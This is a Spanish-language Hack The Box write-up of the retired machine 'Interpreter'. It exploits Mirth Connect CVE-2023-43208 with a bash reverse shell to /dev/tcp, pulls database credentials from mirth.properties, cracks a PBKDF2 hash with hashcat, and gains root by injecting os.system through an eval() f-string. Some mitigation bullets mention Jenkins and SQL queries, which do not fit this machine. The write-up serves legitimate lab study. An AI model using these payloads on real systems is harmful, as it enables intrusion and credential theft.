---
machine: Interpreter
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mirth-connect, cve-2023-43208, xstream, eval, hl7]
---

# Interpreter — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Plataforma de integración sanitaria: **Mirth Connect 4.4.0** con **CVE-2023-43208**, deserialización Java pre-autenticación vía XStream en `/api/users`. Shell como `mirth`; el `mirth.properties` da credenciales de MariaDB, y un hash **PBKDF2-HMAC-SHA256** en `PERSON_PASSWORD` se rompe y se reutiliza por SSH. El root está en un servicio Flask local que solo escucha en `127.0.0.1:54321` y evalúa una **f-string con `eval()`** sobre datos del paciente.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh
80/tcp    http    Mirth Connect 4.4.0 (redirige a HTTPS)
443/tcp   https   Mirth Connect 4.4.0 / API REST
6661/tcp  mllp    listener HL7 v2 del canal interno
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

XStream deserializa el XML de `/api/users` sin allowlist de clases. Con un PoC público:

```bash
git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
python3 exploit.py -t https://<IP> \
  -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
```

```bash
nc -lvnp 4444
```

```text
uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)
```

## Movimiento lateral

```bash
grep -iE "database\.(url|user|password)" /opt/mirthconnect/conf/mirth.properties
```

```text
database.url = jdbc:mysql://localhost:3306/mirthdb
database.user = mirth
database.password = <password>
```

```bash
mysql -u mirth -p'<password>' mirthdb \
  -e "select PERSON_ID, PASSWORD from PERSON_PASSWORD where PERSON_ID=2;"
```

```text
sedric | <hash PBKDF2-HMAC-SHA256, base64>
```

El hash es `PBKDF2WithHmacSHA256` con **600.000 iteraciones**, sal de 8 bytes y clave de 32, todo en base64; hay que reempaquetarlo al formato de hashcat (`sha256:600000:<sal>:<clave>`):

```bash
hashcat -m 10900 'sha256:600000:<salt_b64>:<key_b64>' /usr/share/wordlists/rockyou.txt
ssh sedric@<IP>
```

## Escalada de privilegios

```bash
ss -ltnp | grep '127.0.0.1'
```

```text
127.0.0.1:54321  python3  notif.py
```

El servicio corre como **root** (`notif.py`, `root:sedric`, 2332 bytes), recibe JSON de paciente y monta una plantilla **f-string** que acaba en `eval()`. La lista blanca de caracteres permite llaves, así que el campo del paciente inyecta la expresión:

```bash
curl -s http://127.0.0.1:54321/notify \
  -H 'Content-Type: application/json' \
  -d '{"firstname":"{__import__(\"os\").system(\"chmod +s /bin/bash\")}"}'
```

Los espacios suelen estar filtrados: se codifica la orden en base64 y se decodifica dentro de la propia expresión (`__import__("base64").b64decode(...)`), construyendo la cadena en el `eval`.

```bash
/bin/bash -p
# euid=0
```

## Evidencia

```text
/home/sedric/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- **XStream** es reincidente (Mirth, Jenkins, OFBiz): versión sin allowlist equivale a RCE pre-auth.
- `mirth.properties` es el primer fichero a leer tras entrar en un Mirth; casi siempre lleva la BD en claro.
- Un servicio en `127.0.0.1` **no** es seguro: cualquier shell de usuario lo alcanza.
- Mitigación: Mirth parcheado con allowlist de XStream, secretos fuera de los `.properties` y ningún `eval()` sobre datos externos.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Actualizar Jenkins, deshabilitar la CLI remota y exigir autenticación en el panel.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2023-43208](https://nvd.nist.gov/vuln/detail/CVE-2023-43208)
